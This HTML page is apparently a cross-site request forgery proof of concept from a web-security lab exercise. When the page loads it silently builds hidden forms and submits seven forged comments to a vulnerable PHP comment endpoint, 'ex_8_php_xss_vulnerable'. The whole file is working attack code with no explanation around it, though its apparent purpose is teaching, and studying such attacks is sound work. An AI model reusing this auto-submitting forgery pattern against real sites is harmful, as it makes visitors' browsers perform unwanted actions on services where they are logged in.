<html>
<head>
    <script>
       
        function submitFORM(path, method, params) {
    method = method || "post"; // Set method to post by default if not specified.

    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        if(params.hasOwnProperty(key)) {
            var hiddenField = document.createElement("input");
            hiddenField.setAttribute("type", "hidden");
            hiddenField.setAttribute("name", key);
            hiddenField.setAttribute("value", params[key]);

            form.appendChild(hiddenField);
        }
    }

    document.body.appendChild(form);
    form.submit();
}

function sendPayloads(){
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment2'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment3'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment4'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment5'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment6'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment7'});
	submitFORM('./../ex_8_php_xss_vulnerable/comment_page_post.php', 'POST',
		{'comment':'forged comment8'}
        );

}
</script>
</head>
<body onload="sendPayloads()">
</body>
</html>
